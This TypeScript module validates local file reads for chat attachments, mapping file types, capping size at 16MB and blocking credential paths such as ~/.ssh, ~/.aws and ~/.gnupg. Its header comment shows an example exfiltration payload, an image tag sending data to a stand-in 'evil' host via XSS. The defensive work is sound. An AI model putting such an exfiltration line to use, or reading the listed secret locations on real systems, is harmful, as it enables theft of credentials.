/**
 * file:read-base64 IPC 的可单测纯函数部分（main.ts handler 只做 fs 采集 + 组装）。
 *
 * 用途：chat-ui 发送文件附件时把本地文件读成 base64，走内核 chat.send 的
 * apiAttachments `{type:"file", mimeType, fileName, content}`（内核会 offload 到
 * media store，transcript 落 MediaPaths，刷新后仍可渲染附件卡片）。
 *
 * 大小上限 16MB（原始字节）：内核 chat.send 附件上限 mediaMaxMb 默认 20MB，
 * WS 单帧上限 25MB，base64 编码后体积约 ×1.37（16MB → ~21.9MB），留足余量。
 * 超限不 throw：返回 `{ ok:false, error:"too-large", size }`，由 chat-ui 降级为
 * 旧版文本前缀行为（路径拼进消息文本）。
 *
 * 凭据路径 denylist：渲染层一旦 XSS，file:read-base64 就是任意文件外带原语
 * （chat-ui CSP img-src 含 https:，`<img src="https://evil/?d=...">` 即可带跑
 * 内容）——~/.openclaw 下的 credentials/、openclaw.json、cryoclaw.config.json、
 * 所有 *.log，以及主目录下的 .ssh/ .aws/ .gnupg/ 整目录，命中即拒绝。
 */

import * as os from "os";
import * as path from "path";
import { resolveUserStateDir } from "./constants";

// 16MB 原始文件上限（编码后 ~21.9MB，低于 WS 25MB 单帧上限）
export const FILE_READ_MAX_BYTES = 16 * 1024 * 1024;

// 扩展名 → MIME 映射小表（常见 office/pdf/文本/图片/压缩包/音视频）；
// 表外扩展名兜底 application/octet-stream。
const MIME_BY_EXT: Record<string, string> = {
  // 图片
  png: "image/png",
  jpg: "image/jpeg",
  jpeg: "image/jpeg",
  gif: "image/gif",
  webp: "image/webp",
  bmp: "image/bmp",
  svg: "image/svg+xml",
  ico: "image/x-icon",
  tiff: "image/tiff",
  // 文档
  pdf: "application/pdf",
  txt: "text/plain",
  md: "text/markdown",
  markdown: "text/markdown",
  json: "application/json",
  csv: "text/csv",
  tsv: "text/tab-separated-values",
  log: "text/plain",
  rtf: "application/rtf",
  doc: "application/msword",
  docx: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  xls: "application/vnd.ms-excel",
  xlsx: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  ppt: "application/vnd.ms-powerpoint",
  pptx: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
  odt: "application/vnd.oasis.opendocument.text",
  ods: "application/vnd.oasis.opendocument.spreadsheet",
  odp: "application/vnd.oasis.opendocument.presentation",
  // 压缩包
  zip: "application/zip",
  tar: "application/x-tar",
  gz: "application/gzip",
  bz2: "application/x-bzip2",
  "7z": "application/x-7z-compressed",
  rar: "application/vnd.rar",
  // 音视频
  mp3: "audio/mpeg",
  wav: "audio/wav",
  flac: "audio/flac",
  aac: "audio/aac",
  ogg: "audio/ogg",
  m4a: "audio/mp4",
  mp4: "video/mp4",
  mkv: "video/x-matroska",
  webm: "video/webm",
  avi: "video/x-msvideo",
  mov: "video/quicktime",
  m4v: "video/x-m4v",
  mpg: "video/mpeg",
  mpeg: "video/mpeg",
  // 代码 / 配置（文本类，内核按 text/* 处理）
  html: "text/html",
  css: "text/css",
  xml: "application/xml",
  yml: "application/yaml",
  yaml: "application/yaml",
  toml: "application/toml",
  js: "text/javascript",
  ts: "text/typescript",
  py: "text/x-python",
  sh: "application/x-sh",
};

export function fileExtOfPath(filePath: string): string {
  const base = filePath.split(/[\\/]/).pop() ?? "";
  const m = /\.([A-Za-z0-9]+)$/.exec(base);
  return m ? m[1].toLowerCase() : "";
}

export function mimeTypeForPath(filePath: string): string {
  return MIME_BY_EXT[fileExtOfPath(filePath)] ?? "application/octet-stream";
}

// 跨平台绝对路径判定：POSIX `/...`、Windows 盘符 `C:\`/`C:/`、UNC `\\...`
export function isAbsoluteFilePath(filePath: string): boolean {
  return (
    filePath.startsWith("/") ||
    /^[A-Za-z]:[\\/]/.test(filePath) ||
    filePath.startsWith("\\\\")
  );
}

export type FileReadVerdict =
  | { ok: true }
  | { ok: false; error: "invalid-path" | "not-found" | "not-file" | "denied" }
  | { ok: false; error: "too-large"; size: number };

// ── 凭据路径 denylist ──

// 大小写不敏感文件系统（win32/darwin）上 denylist 比较必须做大小写归一，否则
// ~/.SSH/id_rsa、Credentials/x 之类大小写变体可绕过（对齐
// openclaw-state-archive-paths.ts normalizeForContainment 的做法）。
const CASE_INSENSITIVE_FS = process.platform === "win32" || process.platform === "darwin";

function normalizeDeniedPath(input: string): string {
  const resolved = path.resolve(input);
  return CASE_INSENSITIVE_FS ? resolved.toLowerCase() : resolved;
}

function isSamePathOrInside(candidate: string, root: string): boolean {
  return candidate === root || candidate.startsWith(`${root}${path.sep}`);
}

// denylist 判定（纯函数，单测直接喂路径字符串）：stateDir 内——credentials/
// 整目录及其中文件、openclaw.json、cryoclaw.config.json、所有 *.log；homeDir 下
// 常见凭据位置——.ssh/ .aws/ .gnupg/ 整目录及其中文件。命中返回 true。
export function isCredentialPathDenied(
  filePath: string,
  stateDir: string,
  homeDir: string,
): boolean {
  const target = normalizeDeniedPath(filePath);
  const state = normalizeDeniedPath(stateDir);
  if (isSamePathOrInside(target, normalizeDeniedPath(path.join(stateDir, "credentials")))) {
    return true;
  }
  if (target === normalizeDeniedPath(path.join(stateDir, "openclaw.json"))) return true;
  if (target === normalizeDeniedPath(path.join(stateDir, "cryoclaw.config.json"))) return true;
  // 状态目录内所有 *.log（gateway.log / app.log 等运行日志含诊断信息）
  if (isSamePathOrInside(target, state) && target.endsWith(".log")) return true;
  for (const dir of [".ssh", ".aws", ".gnupg"]) {
    if (isSamePathOrInside(target, normalizeDeniedPath(path.join(homeDir, dir)))) return true;
  }
  return false;
}

// 参数校验 + 大小分支（纯函数）：stat 为 null 表示路径不存在/不可访问
export function evaluateFileReadTarget(
  filePath: unknown,
  stat: { isFile: boolean; size: number } | null,
): FileReadVerdict {
  if (typeof filePath !== "string" || !filePath.trim() || !isAbsoluteFilePath(filePath)) {
    return { ok: false, error: "invalid-path" };
  }
  // 凭据路径 denylist 先于存在性检查：不存在的敏感路径同样是探测目标。
  // 状态目录/主目录解析失败（极端环境）不阻塞正常附件读取，跳过 denylist。
  try {
    if (isCredentialPathDenied(filePath, resolveUserStateDir(), os.homedir())) {
      return { ok: false, error: "denied" };
    }
  } catch { /* denylist 判定失败按放行处理 */ }
  if (!stat) {
    return { ok: false, error: "not-found" };
  }
  if (!stat.isFile) {
    return { ok: false, error: "not-file" };
  }
  if (stat.size > FILE_READ_MAX_BYTES) {
    return { ok: false, error: "too-large", size: stat.size };
  }
  return { ok: true };
}
